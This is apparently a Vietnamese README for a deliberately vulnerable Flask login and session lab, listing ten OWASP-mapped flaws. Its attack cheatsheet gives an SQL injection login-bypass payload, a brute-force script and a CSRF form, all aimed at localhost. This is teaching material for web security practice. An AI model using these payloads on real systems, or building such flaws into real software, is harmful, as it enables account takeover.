# VulnAuth Lab

Một web application **cố tình chứa lỗ hổng bảo mật** trong hệ thống xác thực và quản lý session, phục vụ mục đích học Web Security thông qua thực hành tấn công và vá lỗi.

---

## ⚠ Cảnh báo

App này chứa lỗ hổng thật. Chỉ chạy **local** hoặc môi trường có kiểm soát. Không deploy public.

---

## Mục tiêu

- Hiểu cơ chế hoạt động của các lỗ hổng auth/session phổ biến
- Thực hành tấn công trực tiếp trên môi trường an toàn
- Học cách vá lỗi và viết secure code
- Mapping với OWASP Top 10

---

## Stack

| Layer    | Technology        |
|----------|-------------------|
| Backend  | Python / Flask    |
| Database | MySQL 8.0 (Docker)|
| Frontend | Jinja2 + CSS      |

---

## Cài đặt

**Yêu cầu:** Python 3.10+, Docker Desktop

```bash
# 1. Clone repo
git clone https://github.com/<username>/vulnauth-lab.git
cd vulnauth-lab

# 2. Tạo virtual environment
python -m venv venv
venv\Scripts\activate        # Windows
# source venv/bin/activate   # macOS/Linux

# 3. Cài thư viện
pip install -r requirements.txt

# 4. Chạy MySQL bằng Docker
docker run --name vulnauth-mysql \
  -e MYSQL_ROOT_PASSWORD=rootpass \
  -e MYSQL_DATABASE=vulnauth \
  -e MYSQL_USER=vulnuser \
  -e MYSQL_PASSWORD=vulnpass \
  -p 3306:3306 -d mysql:8.0

# 5. Chạy app
python app.py
```

Mở `http://localhost:5000`

---

## Vulnerabilities

### Authentication

| # | Vulnerability | OWASP | Endpoint |
|---|--------------|-------|----------|
| 1 | SQL Injection login bypass | A03:2021 | `/auth/login` |
| 2 | Brute-force (no rate limit) | A07:2021 | `/auth/login` |
| 3 | Plain-text password storage | A02:2021 | `/auth/register` |
| 4 | User/email enumeration | A01:2021 | `/auth/register`, `/auth/reset` |
| 5 | Predictable reset token | A07:2021 | `/auth/reset` |

### Session Management

| # | Vulnerability | OWASP | Endpoint |
|---|--------------|-------|----------|
| 6 | Session fixation | A07:2021 | `/session/fixation-demo` |
| 7 | Predictable session token (MD5+timestamp) | A02:2021 | `/session/token-gen` |
| 8 | No session expiry | A07:2021 | `/session/no-expiry` |
| 9 | CSRF — no token validation | A01:2021 | `/session/change-email` |
| 10 | Insecure cookie flags | A05:2021 | `/session/insecure-cookie` |

---

## Test Credentials

| Username | Password  | Role  |
|----------|-----------|-------|
| admin    | admin123  | admin |
| alice    | password  | user  |
| bob      | 123456    | user  |

---

## Attack Cheatsheet

**SQL Injection bypass:**
```
Username: admin' #
Password: anything
```

**Brute-force script:**
```python
import requests

url = "http://localhost:5000/auth/login"
wordlist = ["wrongpass", "letmein", "123456", "admin123"]

for pwd in wordlist:
    r = requests.post(url, data={"username": "admin", "password": pwd},
                      allow_redirects=False)
    if r.status_code == 302:
        print(f"[+] Found: {pwd}")
        break
    print(f"[-] {pwd}")
```

**CSRF PoC** — lưu thành `evil.html`, mở khi đang login:
```html
<form action="http://localhost:5000/session/change-email" method="POST" id="f">
  <input name="email" value="hacker@evil.com">
</form>
<script>document.getElementById('f').submit()</script>
```

---

## Cấu trúc project

```
vulnauth-lab/
├── app.py                  # Flask app, routes chính
├── database.py             # MySQL connection
├── schema.sql              # DB schema + seed data
├── requirements.txt
├── bruteforce.py           # Attack script mẫu
├── modules/
│   ├── auth/
│   │   └── routes.py       # Auth vulnerabilities (1-5)
│   └── session/
│       └── routes.py       # Session vulnerabilities (6-10)
├── templates/
│   ├── base.html
│   ├── index.html
│   ├── dashboard.html
│   ├── auth/
│   └── session/
└── static/
    └── css/style.css
```

---

## Roadmap

- [x] Auth vulnerabilities (5/5)
- [x] Session vulnerabilities (5/5)
- [ ] Writeup pages với secure fix + diff
- [ ] Flag submission system
- [ ] Secure mode toggle — so sánh vuln vs patched code
- [ ] Docker Compose setup